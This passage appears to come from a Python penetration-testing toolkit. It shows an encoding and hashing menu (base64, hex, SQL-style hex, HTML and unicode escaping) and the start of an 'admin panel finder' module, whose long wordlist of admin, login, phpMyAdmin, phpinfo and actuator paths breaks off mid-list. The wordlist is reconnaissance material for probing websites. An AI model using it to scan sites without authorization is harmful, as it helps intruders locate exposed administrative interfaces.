            print(f"\n{Colors.OKGREEN}Input:{Colors.ENDC}")
            print(f"{Colors.WHITE}{text}{Colors.ENDC}")
            print(f"\n{Colors.OKGREEN}URL Decoded:{Colors.ENDC}")
            print(f"{Colors.WHITE}{decoded}{Colors.ENDC}")
            
            # Plus decoding
            decoded_plus = urllib.parse.unquote_plus(text)
            print(f"\n{Colors.OKGREEN}URL Decoded (plus):{Colors.ENDC}")
            print(f"{Colors.WHITE}{decoded_plus}{Colors.ENDC}")
        except Exception as e:
            error(f"Decoding error: {str(e)}")
        
        press_enter()
    
    def base64_encode(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ BASE64 ENCODE ]{Colors.ENDC}")
        separator()
        
        text = prompt("Enter text to encode")
        if not text:
            error("No input provided!")
            press_enter()
            return
        
        encoded = base64.b64encode(text.encode()).decode()
        print(f"\n{Colors.OKGREEN}Input:{Colors.ENDC}")
        print(f"{Colors.WHITE}{text}{Colors.ENDC}")
        print(f"\n{Colors.OKGREEN}Base64 Encoded:{Colors.ENDC}")
        print(f"{Colors.WHITE}{encoded}{Colors.ENDC}")
        
        # URL-safe variant
        urlsafe = base64.urlsafe_b64encode(text.encode()).decode()
        print(f"\n{Colors.OKGREEN}URL-safe Base64:{Colors.ENDC}")
        print(f"{Colors.WHITE}{urlsafe}{Colors.ENDC}")
        
        press_enter()
    
    def base64_decode(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ BASE64 DECODE ]{Colors.ENDC}")
        separator()
        
        text = prompt("Enter text to decode")
        if not text:
            error("No input provided!")
            press_enter()
            return
        
        try:
            # Add padding if needed
            padding = 4 - len(text) % 4
            if padding != 4:
                text += '=' * padding
            
            decoded = base64.b64decode(text).decode()
            print(f"\n{Colors.OKGREEN}Input:{Colors.ENDC}")
            print(f"{Colors.WHITE}{text}{Colors.ENDC}")
            print(f"\n{Colors.OKGREEN}Base64 Decoded:{Colors.ENDC}")
            print(f"{Colors.WHITE}{decoded}{Colors.ENDC}")
        except Exception as e:
            error(f"Decoding error: {str(e)}")
        
        press_enter()
    
    def hex_encode(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ HEX ENCODE ]{Colors.ENDC}")
        separator()
        
        text = prompt("Enter text to encode")
        if not text:
            error("No input provided!")
            press_enter()
            return
        
        # Full hex
        full_hex = binascii.hexlify(text.encode()).decode()
        # With 0x prefix
        prefixed = '0x' + full_hex
        # SQL hex
        sql_hex = '0x' + full_hex
        # Without spaces
        compact = full_hex
        
        print(f"\n{Colors.OKGREEN}Input:{Colors.ENDC}")
        print(f"{Colors.WHITE}{text}{Colors.ENDC}")
        print(f"\n{Colors.OKGREEN}Hex (compact):{Colors.ENDC}")
        print(f"{Colors.WHITE}{compact}{Colors.ENDC}")
        print(f"\n{Colors.OKGREEN}Hex (0x prefix):{Colors.ENDC}")
        print(f"{Colors.WHITE}{prefixed}{Colors.ENDC}")
        print(f"\n{Colors.OKGREEN}Hex (SQL style):{Colors.ENDC}")
        print(f"{Colors.WHITE}{sql_hex}{Colors.ENDC}")
        
        # Character by character
        print(f"\n{Colors.OKGREEN}Hex (char by char):{Colors.ENDC}")
        chars = ' '.join([hex(ord(c))[2:].zfill(2) for c in text])
        print(f"{Colors.WHITE}{chars}{Colors.ENDC}")
        
        # With \\x prefix
        print(f"\n{Colors.OKGREEN}Hex (\\x prefix):{Colors.ENDC}")
        chars_x = '\\x' + '\\x'.join([hex(ord(c))[2:].zfill(2) for c in text])
        print(f"{Colors.WHITE}{chars_x}{Colors.ENDC}")
        
        press_enter()
    
    def hex_decode(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ HEX DECODE ]{Colors.ENDC}")
        separator()
        
        text = prompt("Enter hex to decode (with or without 0x prefix)")
        if not text:
            error("No input provided!")
            press_enter()
            return
        
        try:
            # Remove 0x prefix and spaces
            clean = text.replace('0x', '').replace('0X', '').replace(' ', '').replace('\\x', '')
            decoded = binascii.unhexlify(clean).decode()
            print(f"\n{Colors.OKGREEN}Input:{Colors.ENDC}")
            print(f"{Colors.WHITE}{text}{Colors.ENDC}")
            print(f"\n{Colors.OKGREEN}Hex Decoded:{Colors.ENDC}")
            print(f"{Colors.WHITE}{decoded}{Colors.ENDC}")
        except Exception as e:
            error(f"Decoding error: {str(e)}")
        
        press_enter()
    
    def binary_encode(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ BINARY ENCODE ]{Colors.ENDC}")
        separator()
        
        text = prompt("Enter text to encode")
        if not text:
            error("No input provided!")
            press_enter()
            return
        
        # Full binary
        binary = ' '.join(format(ord(c), '08b') for c in text)
        # Compact
        compact = ''.join(format(ord(c), '08b') for c in text)
        
        print(f"\n{Colors.OKGREEN}Input:{Colors.ENDC}")
        print(f"{Colors.WHITE}{text}{Colors.ENDC}")
        print(f"\n{Colors.OKGREEN}Binary (with spaces):{Colors.ENDC}")
        print(f"{Colors.WHITE}{binary}{Colors.ENDC}")
        print(f"\n{Colors.OKGREEN}Binary (compact):{Colors.ENDC}")
        print(f"{Colors.WHITE}{compact}{Colors.ENDC}")
        
        # Character by character
        print(f"\n{Colors.OKGREEN}Binary (char breakdown):{Colors.ENDC}")
        for c in text:
            print(f"{Colors.WHITE}  {c} = {format(ord(c), '08b')} = {ord(c)}{Colors.ENDC}")
        
        press_enter()
    
    def binary_decode(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ BINARY DECODE ]{Colors.ENDC}")
        separator()
        
        text = prompt("Enter binary to decode (space-separated or continuous 8-bit)")
        if not text:
            error("No input provided!")
            press_enter()
            return
        
        try:
            # Remove spaces
            clean = text.replace(' ', '')
            # Split into 8-bit chunks
            if len(clean) % 8 != 0:
                error("Binary length must be multiple of 8!")
                press_enter()
                return
            
            chars = [chr(int(clean[i:i+8], 2)) for i in range(0, len(clean), 8)]
            decoded = ''.join(chars)
            
            print(f"\n{Colors.OKGREEN}Input:{Colors.ENDC}")
            print(f"{Colors.WHITE}{text}{Colors.ENDC}")
            print(f"\n{Colors.OKGREEN}Binary Decoded:{Colors.ENDC}")
            print(f"{Colors.WHITE}{decoded}{Colors.ENDC}")
        except Exception as e:
            error(f"Decoding error: {str(e)}")
        
        press_enter()
    
    def ascii_to_char(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ ASCII TO CHARACTER ]{Colors.ENDC}")
        separator()
        
        text = prompt("Enter ASCII codes (space-separated)")
        if not text:
            error("No input provided!")
            press_enter()
            return
        
        try:
            codes = [int(c) for c in text.split()]
            chars = ''.join([chr(c) for c in codes])
            
            print(f"\n{Colors.OKGREEN}ASCII Codes:{Colors.ENDC}")
            print(f"{Colors.WHITE}{text}{Colors.ENDC}")
            print(f"\n{Colors.OKGREEN}Characters:{Colors.ENDC}")
            print(f"{Colors.WHITE}{chars}{Colors.ENDC}")
            
            # Breakdown
            print(f"\n{Colors.OKGREEN}Breakdown:{Colors.ENDC}")
            for i, c in enumerate(codes):
                print(f"{Colors.WHITE}  {c} -> {chr(c)}{Colors.ENDC}")
        except Exception as e:
            error(f"Conversion error: {str(e)}")
        
        press_enter()
    
    def char_to_ascii(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ CHARACTER TO ASCII ]{Colors.ENDC}")
        separator()
        
        text = prompt("Enter text")
        if not text:
            error("No input provided!")
            press_enter()
            return
        
        ascii_codes = ' '.join([str(ord(c)) for c in text])
        hex_codes = ' '.join([hex(ord(c)) for c in text])
        
        print(f"\n{Colors.OKGREEN}Input:{Colors.ENDC}")
        print(f"{Colors.WHITE}{text}{Colors.ENDC}")
        print(f"\n{Colors.OKGREEN}ASCII Codes:{Colors.ENDC}")
        print(f"{Colors.WHITE}{ascii_codes}{Colors.ENDC}")
        print(f"\n{Colors.OKGREEN}Hex Codes:{Colors.ENDC}")
        print(f"{Colors.WHITE}{hex_codes}{Colors.ENDC}")
        
        # Breakdown
        print(f"\n{Colors.OKGREEN}Character Breakdown:{Colors.ENDC}")
        for c in text:
            print(f"{Colors.WHITE}  '{c}' -> ASCII: {ord(c)}, Hex: {hex(ord(c))}, Binary: {format(ord(c), '08b')}{Colors.ENDC}")
        
        press_enter()
    
    def rot13(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ ROT13 ]{Colors.ENDC}")
        separator()
        
        text = prompt("Enter text")
        if not text:
            error("No input provided!")
            press_enter()
            return
        
        # ROT13 is its own inverse
        import codecs
        encoded = codecs.encode(text, 'rot_13')
        
        print(f"\n{Colors.OKGREEN}Input:{Colors.ENDC}")
        print(f"{Colors.WHITE}{text}{Colors.ENDC}")
        print(f"\n{Colors.OKGREEN}ROT13:{Colors.ENDC}")
        print(f"{Colors.WHITE}{encoded}{Colors.ENDC}")
        print(f"\n{Colors.GRAY}Note: ROT13 is its own inverse. Apply again to decode.{Colors.ENDC}")
        
        press_enter()
    
    def md5_hash(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ MD5 HASH ]{Colors.ENDC}")
        separator()
        
        text = prompt("Enter text to hash")
        if not text:
            error("No input provided!")
            press_enter()
            return
        
        md5 = hashlib.md5(text.encode()).hexdigest()
        
        print(f"\n{Colors.OKGREEN}Input:{Colors.ENDC}")
        print(f"{Colors.WHITE}{text}{Colors.ENDC}")
        print(f"\n{Colors.OKGREEN}MD5 Hash:{Colors.ENDC}")
        print(f"{Colors.WHITE}{md5}{Colors.ENDC}")
        
        press_enter()
    
    def sha1_hash(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ SHA1 HASH ]{Colors.ENDC}")
        separator()
        
        text = prompt("Enter text to hash")
        if not text:
            error("No input provided!")
            press_enter()
            return
        
        sha1 = hashlib.sha1(text.encode()).hexdigest()
        
        print(f"\n{Colors.OKGREEN}Input:{Colors.ENDC}")
        print(f"{Colors.WHITE}{text}{Colors.ENDC}")
        print(f"\n{Colors.OKGREEN}SHA1 Hash:{Colors.ENDC}")
        print(f"{Colors.WHITE}{sha1}{Colors.ENDC}")
        
        press_enter()
    
    def sha256_hash(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ SHA256 HASH ]{Colors.ENDC}")
        separator()
        
        text = prompt("Enter text to hash")
        if not text:
            error("No input provided!")
            press_enter()
            return
        
        sha256 = hashlib.sha256(text.encode()).hexdigest()
        
        print(f"\n{Colors.OKGREEN}Input:{Colors.ENDC}")
        print(f"{Colors.WHITE}{text}{Colors.ENDC}")
        print(f"\n{Colors.OKGREEN}SHA256 Hash:{Colors.ENDC}")
        print(f"{Colors.WHITE}{sha256}{Colors.ENDC}")
        
        press_enter()
    
    def sha512_hash(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ SHA512 HASH ]{Colors.ENDC}")
        separator()
        
        text = prompt("Enter text to hash")
        if not text:
            error("No input provided!")
            press_enter()
            return
        
        sha512 = hashlib.sha512(text.encode()).hexdigest()
        
        print(f"\n{Colors.OKGREEN}Input:{Colors.ENDC}")
        print(f"{Colors.WHITE}{text}{Colors.ENDC}")
        print(f"\n{Colors.OKGREEN}SHA512 Hash:{Colors.ENDC}")
        print(f"{Colors.WHITE}{sha512}{Colors.ENDC}")
        
        press_enter()
    
    def html_encode(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ HTML ENTITIES ENCODE ]{Colors.ENDC}")
        separator()
        
        text = prompt("Enter text to encode")
        if not text:
            error("No input provided!")
            press_enter()
            return
        
        import html
        encoded = html.escape(text)
        # Numeric entities
        numeric = ''.join([f"&#{ord(c)};" for c in text])
        # Hex entities
        hex_entities = ''.join([f"&#x{ord(c):x};" for c in text])
        
        print(f"\n{Colors.OKGREEN}Input:{Colors.ENDC}")
        print(f"{Colors.WHITE}{text}{Colors.ENDC}")
        print(f"\n{Colors.OKGREEN}HTML Entities (named):{Colors.ENDC}")
        print(f"{Colors.WHITE}{encoded}{Colors.ENDC}")
        print(f"\n{Colors.OKGREEN}HTML Entities (numeric):{Colors.ENDC}")
        print(f"{Colors.WHITE}{numeric}{Colors.ENDC}")
        print(f"\n{Colors.OKGREEN}HTML Entities (hex):{Colors.ENDC}")
        print(f"{Colors.WHITE}{hex_entities}{Colors.ENDC}")
        
        press_enter()
    
    def html_decode(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ HTML ENTITIES DECODE ]{Colors.ENDC}")
        separator()
        
        text = prompt("Enter HTML entities to decode")
        if not text:
            error("No input provided!")
            press_enter()
            return
        
        import html
        decoded = html.unescape(text)
        
        print(f"\n{Colors.OKGREEN}Input:{Colors.ENDC}")
        print(f"{Colors.WHITE}{text}{Colors.ENDC}")
        print(f"\n{Colors.OKGREEN}HTML Decoded:{Colors.ENDC}")
        print(f"{Colors.WHITE}{decoded}{Colors.ENDC}")
        
        press_enter()
    
    def unicode_escape(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ UNICODE ESCAPE ]{Colors.ENDC}")
        separator()
        
        text = prompt("Enter text")
        if not text:
            error("No input provided!")
            press_enter()
            return
        
        # Escape
        escaped = text.encode('unicode_escape').decode()
        # Format as \uXXXX
        u_format = ''.join([f"\\u{ord(c):04x}" for c in text])
        # Format as \UXXXXXXXX
        U_format = ''.join([f"\\U{ord(c):08x}" for c in text])
        
        print(f"\n{Colors.OKGREEN}Input:{Colors.ENDC}")
        print(f"{Colors.WHITE}{text}{Colors.ENDC}")
        print(f"\n{Colors.OKGREEN}Unicode Escape (\\uXXXX):{Colors.ENDC}")
        print(f"{Colors.WHITE}{u_format}{Colors.ENDC}")
        print(f"\n{Colors.OKGREEN}Unicode Escape (python):{Colors.ENDC}")
        print(f"{Colors.WHITE}{escaped}{Colors.ENDC}")
        
        # Unescape
        unescaped = escaped.encode().decode('unicode_escape')
        print(f"\n{Colors.OKGREEN}Unescaped:{Colors.ENDC}")
        print(f"{Colors.WHITE}{unescaped}{Colors.ENDC}")
        
        press_enter()
    
    def json_escape(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ JSON ESCAPE ]{Colors.ENDC}")
        separator()
        
        text = prompt("Enter text")
        if not text:
            error("No input provided!")
            press_enter()
            return
        
        import json
        escaped = json.dumps(text)
        
        print(f"\n{Colors.OKGREEN}Input:{Colors.ENDC}")
        print(f"{Colors.WHITE}{text}{Colors.ENDC}")
        print(f"\n{Colors.OKGREEN}JSON Escaped:{Colors.ENDC}")
        print(f"{Colors.WHITE}{escaped}{Colors.ENDC}")
        
        # Without quotes
        unquoted = escaped[1:-1]
        print(f"\n{Colors.OKGREEN}JSON Escaped (no quotes):{Colors.ENDC}")
        print(f"{Colors.WHITE}{unquoted}{Colors.ENDC}")
        
        press_enter()
    
    def all_encodings(self):
        clear()
        banner()
        print(f"{Colors.OKCYAN}{Colors.BOLD}[ ALL ENCODINGS ]{Colors.ENDC}")
        separator()
        
        text = prompt("Enter text to encode in all formats")
        if not text:
            error("No input provided!")
            press_enter()
            return
        
        import json
        import html as html_lib
        
        print(f"\n{Colors.OKCYAN}Input: {Colors.WHITE}{text}{Colors.ENDC}\n")
        separator()
        
        # URL
        print(f"\n{Colors.OKGREEN}[URL Encode]{Colors.ENDC}")
        print(f"{Colors.WHITE}{urllib.parse.quote(text)}{Colors.ENDC}")
        
        # Base64
        print(f"\n{Colors.OKGREEN}[Base64]{Colors.ENDC}")
        print(f"{Colors.WHITE}{base64.b64encode(text.encode()).decode()}{Colors.ENDC}")
        
        # Hex
        print(f"\n{Colors.OKGREEN}[Hex]{Colors.ENDC}")
        print(f"{Colors.WHITE}0x{binascii.hexlify(text.encode()).decode()}{Colors.ENDC}")
        
        # Binary
        print(f"\n{Colors.OKGREEN}[Binary]{Colors.ENDC}")
        print(f"{Colors.WHITE}{' '.join(format(ord(c), '08b') for c in text)}{Colors.ENDC}")
        
        # ASCII
        print(f"\n{Colors.OKGREEN}[ASCII Codes]{Colors.ENDC}")
        print(f"{Colors.WHITE}{' '.join([str(ord(c)) for c in text])}{Colors.ENDC}")
        
        # HTML Entities
        print(f"\n{Colors.OKGREEN}[HTML Entities]{Colors.ENDC}")
        print(f"{Colors.WHITE}{html_lib.escape(text)}{Colors.ENDC}")
        
        # Unicode
        print(f"\n{Colors.OKGREEN}[Unicode Escape]{Colors.ENDC}")
        print(f"{Colors.WHITE}{''.join([f'\\u{ord(c):04x}' for c in text])}{Colors.ENDC}")
        
        # JSON
        print(f"\n{Colors.OKGREEN}[JSON Escaped]{Colors.ENDC}")
        print(f"{Colors.WHITE}{json.dumps(text)}{Colors.ENDC}")
        
        # MD5
        print(f"\n{Colors.OKGREEN}[MD5]{Colors.ENDC}")
        print(f"{Colors.WHITE}{hashlib.md5(text.encode()).hexdigest()}{Colors.ENDC}")
        
        # SHA256
        print(f"\n{Colors.OKGREEN}[SHA256]{Colors.ENDC}")
        print(f"{Colors.WHITE}{hashlib.sha256(text.encode()).hexdigest()}{Colors.ENDC}")
        
        # ROT13
        import codecs
        print(f"\n{Colors.OKGREEN}[ROT13]{Colors.ENDC}")
        print(f"{Colors.WHITE}{codecs.encode(text, 'rot_13')}{Colors.ENDC}")
        
        press_enter()


# ─────────────────────────────────────────────────────────────────────────────
# MODULE 4: ADMIN PANEL FINDER
# ─────────────────────────────────────────────────────────────────────────────

class AdminFinder:
    def __init__(self):
        self.common_paths = [
            "admin", "administrator", "admin1", "admin2", "admin3", "admin4",
            "admin5", "admin/login", "admin/login.php", "admin/login.html",
            "administrator/login", "administrator/login.php",
            "wp-admin", "wp-login.php", "wp-login",
            "adminpanel", "adminpanel.php", "adminpanel.html",
            "moderator", "moderator/login", "moderator/login.php",
            "webadmin", "webadmin/login", "webadmin/login.php",
            "webadmin/index.php", "webadmin/admin",
            "account", "account/login", "account/login.php",
            "controlpanel", "controlpanel.php", "controlpanel.html",
            "admincontrol", "admincontrol.php", "admincontrol.html",
            "adminLogin", "adminLogin.php", "adminLogin.html",
            "admin_area", "admin_area.php", "admin_area.html",
            "panel-administracion", "panel-administracion/login.php",
            "instadmin", "instadmin.php", "instadmin.html",
            "memberadmin", "memberadmin.php", "memberadmin.html",
            "administratorlogin", "administratorlogin.php",
            "adm", "adm.php", "adm.html", "adm/login",
            "cp", "cp.php", "cp.html", "cp/login",
            "manager", "manager.php", "manager/html",
            "management", "management.php", "management.html",
            "member", "member.php", "member.html",
            "members", "members.php", "members.html",
            "user", "user.php", "user.html", "user/login",
            "users", "users.php", "users.html",
            "login", "login.php", "login.html",
            "signin", "signin.php", "signin.html",
            "signup", "signup.php", "signup.html",
            "register", "register.php", "register.html",
            "auth", "auth.php", "auth.html", "auth/login",
            "dashboard", "dashboard.php", "dashboard.html",
            "cms", "cms.php", "cms/login",
            "panel", "panel.php", "panel/login",
            "backend", "backend.php", "backend/login",
            "sysadmin", "sysadmin.php", "sysadmin/login",
            "root", "root.php", "root/login",
            "secure", "secure/login", "secure/login.php",
            "private", "private/login", "private/login.php",
            "staff", "staff/login", "staff/login.php",
            "support", "support/login", "support/login.php",
            "siteadmin", "siteadmin.php", "siteadmin/login.php",
            "superuser", "superuser.php", "superuser/login.php",
            "superadmin", "superadmin.php", "superadmin/login.php",
            "master", "master.php", "master/login.php",
            "control", "control.php", "control/login.php",
            "admincp", "admincp.php", "admincp/login.php",
            "modcp", "modcp.php", "modcp/login.php",
            "webmaster", "webmaster.php", "webmaster/login.php",
            "administrator/account.php", "administrator/account.html",
            "admin/account.php", "admin/account.html",
            "admin_area/admin.php", "admin_area/admin.html",
            "admin_area/login.php", "admin_area/login.html",
            "admin_area/index.php", "admin_area/index.html",
            "admin_area/index.php", "bb-admin/index.php",
            "bb-admin/login.php", "bb-admin/admin.php",
            "admin/home.php", "admin/controlpanel.html",
            "admin/cp.php", "admin/cp.html",
            "admin/index2.php", "admin/index2.html",
            "admin2.php", "admin2.html",
            "admin2/login.php", "admin2/login.html",
            "admin2/index.php", "admin2/index.html",
            "yonetim.php", "yonetim.html",
            "yonetici.php", "yonetici.html",
            "phpmyadmin", "phpmyadmin/index.php",
            "phpMyAdmin", "phpMyAdmin/index.php",
            "mysql", "mysqladmin", "mysql-admin",
            "sqladmin", "sql-admin", "dbadmin",
            "database", "database/admin", "db/admin",
            "adminer.php", "adminer", "adminer/index.php",
            "phpminiadmin", "phpminiadmin.php",
            "myadmin", "myadmin/index.php",
            "mysqlmanager", "mysql-manager",
            "pma", "pma/index.php",
            "config", "config.php", "configuration.php",
            "setup", "setup.php", "install", "install.php",
            "server", "server-status", "server-info",
            "status", "info.php", "phpinfo.php", "phpinfo",
            "api", "api/admin", "api/v1/admin",
            "graphql", "graphiql", "playground",
            "swagger", "swagger-ui.html", "api-docs",
            "actuator", "actuator/health", "actuator/env",
            "env", "environment", "config.json",
            "_all_dbs", "_utils", "couchdb",
            "elastic", "elasticsearch", "kibana",
            "solr", "solr/admin",
            "hdfs", "hadoop", "yarn",
            "jenkins", "jenkins/login",
            "grafana", "grafana/login",
            "prometheus", "alertmanager",
            "nagios", "zabbix", "zabbix.php",
            "cacti", "munin", "ganglia",
            "laravel", "laravel/admin",
            "django", "django/admin",
            "rails", "rails/admin", "sidekiq",
            "spring-boot", "spring/actuator",
            "portal", "portal.php", "portal/admin",
            "webmail", "webmail/src/login.php",
            " Horde", "roundcube", "squirrelmail",
            "admin/logout.php", "admin/logout",
            "admin/forgot_password.php",
            "admin/reset_password.php",
            "admin/register.php",
            "admin/signup.php",
            "admin/password.php",
            "admin/profile.php",
            "admin/settings.php",
            "admin/config.php",
            "admin/options.php",
            "admin/backup.php",
            "admin/export.php",
            "admin/import.php",
            "admin/update.php",
            "admin/upgrade.php",
            "admin/upload.php",
            "admin/filemanager.php",
            "admin/media.php",
            "admin/plugins.php",
            "admin/themes.php",
            "admin/modules.php",
            "admin/extensions.php",
            "admin/tools.php",
            "admin/maintenance.php",
            "admin/cron.php",
            "admin/cache.php",
            "admin/logs.php",
            "admin/error_log.php",
            "admin/access_log.php",
            "admin/debug.php",
            "admin/phpinfo.php",
            "admin/info.php",
            "admin/system.php",
            "admin/server.php",
            "admin/network.php",
            "admin/database.php",
            "admin/users.php",
            "admin/groups.php",
            "admin/roles.php",
            "admin/permissions.php",
            "admin/members.php",
            "admin/customers.php",
            "admin/clients.php",
            "admin/orders.php",
            "admin/products.php",
            "admin/categories.php",
            "admin/posts.php",
            "admin/pages.php",
            "admin/articles.php",
            "admin/comments.php",
            "admin/messages.php",
            "admin/emails.php",
            "admin/newsletters.php",
            "admin/notifications.php",
            "admin/reports.php",
            "admin/analytics.php",
            "admin/statistics.php",
            "admin/charts.php",
            "admin/search.php",
            "admin/help.php",
            "admin/support.php",
            "admin/tickets.php",
            "admin/faq.php",
            "admin/documentation.php",
            "admin/manual.php",
            "admin/guide.php",
            "admin/tutorial.php",
            "admin/api.php",
            "admin/webhooks.php",
            "admin/integration.php",
            "admin/payment.php",
            "admin/billing.php",
            "admin/invoices.php",
            "admin/shipping.php",
            "admin/tax.php",
            "admin/currency.php",
            "admin/languages.php",
            "admin/translations.php",
            "admin/locale.php",
            "admin/timezone.php",
            "admin/date.php",
            "admin/security.php",
            "admin/firewall.php",
            "admin/ssl.php",
            "admin/https.php",
            "admin/certificates.php",
            "admin/ssh.php",
            "admin/ftp.php",
            "admin/sftp.php",
            "admin/mail.php",
            "admin/smtp.php",
            "admin/dns.php",
            "admin/domains.php",
            "admin/subdomains.php",
            "admin/parking.php",
            "admin/redirects.php",
            "admin/aliases.php",
            "admin/cronjobs.php",
            "admin/tasks.php",
            "admin/schedules.php",
            "admin/workflows.php",
            "admin/automation.php",
            "admin/triggers.php",
            "admin/actions.php",
            "admin/rules.php",
            "admin/filters.php",
            "admin/tags.php",
            "admin/labels.php",
            "admin/custom-fields.php",
            "admin/metadata.php",
            "admin/seo.php",
            "admin/sitemap.php",
            "admin/robots.php",
            "admin/redirect.php",
            "admin/shorturls.php",
            "admin/links.php",
            "admin/ads.php",
            "admin/banners.php",
            "admin/widgets.php",
            "admin/sliders.php",
            "admin/galleries.php",
            "admin/portfolios.php",
            "admin/testimonials.php",
            "admin/reviews.php",
            "admin/ratings.php",
            "admin/surveys.php",
            "admin/polls.php",
            "admin/quizzes.php",
            "admin/forms.php",
            "admin/surveys.php",
            "admin/events.php",
            "admin/bookings.php",
            "admin/reservations.php",
            "admin/appointments.php",
            "admin/calendar.php",
            "admin/maps.php",
            "admin/locations.php",
            "admin/branches.php",
            "admin/departments.php",
            "admin/teams.php",
            "admin/employees.php",
            "admin/staff.php",
            "admin/volunteers.php",
            "admin/partners.php",
            "admin/sponsors.php",
            "admin/affiliates.php",
            "admin/referrals.php",
            "admin/coupons.php",
            "admin/discounts.php",
            "admin/sales.php",
            "admin/promotions.php",
            "admin/campaigns.php",
            "admin/leads.php",
            "admin/opportunities.php",
            "admin/pipeline.php",
            "admin/deals.php",
            "admin/contracts.php",
            "admin/agreements.php",
            "admin/proposals.php",
            "admin/quotes.php",
            "admin/estimates.php",
            "admin/projects.php",
            "admin/tasks.php",
            "admin/milestones.php",
            "admin/boards.php",
            "admin/lists.php",
            "admin/cards.php",
            "admin/kanban.php",
            "admin/timeline.php",
            "admin/gantt.php",
            "admin/wiki.php",
            "admin/kb.php",
            "admin/knowledgebase.php",
            "admin/articles.php",
            "admin/blog.php",
            "admin/news.php",
            "admin/press.php",
            "admin/media.php",
            "admin/presskit.php",
            "admin/branding.php",
            "admin/assets.php",
            "admin/resources.php",
            "admin/downloads.php",
            "admin/uploads.php",
            "admin/attachments.php",
            "admin/files.php",
            "admin/documents.php",
            "admin/pdfs.php",
            "admin/images.php",
            "admin/videos.php",
            "admin/audio.php",
            "admin/feeds.php",
            "admin/rss.php",
            "admin/atom.php",
            "admin/social.php",
            "admin/share.php",
            "admin/follow.php",
            "admin/like.php",
            "admin/comment.php",
            "admin/review.php",
            "admin/feedback.php",
            "admin/suggestion.php",
            "admin/issue.php",
            "admin/bug.php",
            "admin/feature.php",
            "admin/request.php",
            "admin/idea.php",
            "admin/vote.php",
            "admin/survey.php",
            "admin/poll.php",
            "admin/quiz.php",
            "admin/exam.php",
            "admin/test.php",
            "admin/assessment.php",
            "admin/certification.php",
            "admin/badge.php",
            "admin/achievement.php",
            "admin/reward.php",
            "admin/point.php",
            "admin/credit.php",
            "admin/wallet.php",
            "admin/balance.php",
            "admin/transaction.php",
            "admin/statement.php",
            "admin/report.php",
            "admin/analytic.php",
            "admin/statistic.php",
            "admin/metric.php",
            "admin/kpi.php",
            "admin/goal.php",
            "admin/objective.php",
            "admin/target.php",
            "admin/quota.php",
            "admin/limit.php",
            "admin/threshold.php",
            "admin/alert.php",
            "admin/notification.php",
            "admin/reminder.php",
            "admin/warning.php",
            "admin/error.php",
            "admin/exception.php",
            "admin/incident.php",
            "admin/audit.php",
            "admin/log.php",
            "admin/history.php",
            "admin/activity.php",
            "admin/event.php",
            "admin/change.php",
            "admin/version.php",
            "admin/release.php",
            "admin/deployment.php",
            "admin/build.php",
            "admin/ci.php",
            "admin/cd.php",
            "admin/devops.php",
            "admin/sre.php",
            "admin/monitoring.php",
            "admin/observability.php",
            "admin/tracing.php",
            "admin/logging.php",
            "admin/metrics.php",
            "admin/alerting.php",
            "admin/oncall.php",
            "admin/escalation.php",
            "admin/runbook.php",
            "admin/playbook.php",
            "admin/procedure.php",
            "admin/policy.php",
            "admin/governance.php",
            "admin/compliance.php",
            "admin/regulation.php",
            "admin/standard.php",
            "admin/framework.php",
            "admin/bestpractice.php",
            "admin/guideline.php",
            "admin/checklist.php",
            "admin/template.php",
            "admin/sample.php",
            "admin/example.php",
            "admin/demo.php",
            "admin/sandbox.php",
            "admin/staging.php",
            "admin/testing.php",
            "admin/qa.php",
            "admin/uat.php",
            "admin/beta.php",
            "admin/preview.php",
            "admin/draft.php",
            "admin/pending.php",
            "admin/approved.php",
            "admin/rejected.php",
            "admin/archived.php",
            "admin/deleted.php",
            "admin/trash.php",
            "admin/recycle.php",
            "admin/restore.php",
            "admin/backup.php",
            "admin/snapshot.php",
            "admin/clone.php",
            "admin/copy.php",
            "admin/duplicate.php",
            "admin/fork.php",
            "admin/merge.php",
            "admin/split.php",
            "admin/join.php",
            "admin/combine.php",
            "admin/aggregate.php",
            "admin/summarize.php",
            "admin/consolidate.php",
            "admin/integrate.php",
            "admin/migrate.php",
            "admin/import.php",
            "admin/export.php",
            "admin/sync.php",
            "admin/replicate.php",
            "admin/mirror.php",
            "admin/cache.php",
            "admin/cdn.php",
            "admin/dns.php",
            "admin/loadbalancer.php",
            "admin/proxy.php",
            "admin/gateway.php",
            "admin/firewall.php",
            "admin/vpn.php",
            "admin/vpc.php",
            "admin/subnet.php",
            "admin/network.php",
            "admin/topology.php",
            "admin/infrastructure.php",
            "admin/architecture.php",
            "admin/design.php",
            "admin/diagram.php",
            "admin/schema.php",
            "admin/model.php",
            "admin/entity.php",
            "admin/relationship.php",
            "admin/association.php",
            "admin/dependency.php",
            "admin/constraint.php",
            "admin/rule.php",
            "admin/validation.php",
            "admin/verification.php",
            "admin/confirmation.php",
            "admin/authentication.php",
            "admin/authorization.php",
            "admin/permission.php",
            "admin/privilege.php",
            "admin/right.php",
            "admin/access.php",
            "admin/role.php",
            "admin/group.php",
            "admin/team.php",
            "admin/organization.php",
            "admin/tenant.php",
            "admin/workspace.php",
            "admin/project.php",
            "admin/application.php",
            "admin/service.php",
            "admin/microservice.php",
            "admin/container.php",
            "admin/pod.php",
            "admin/node.php",
            "admin/cluster.php",
            "admin/orchestrator.php",
            "admin/scheduler.php",
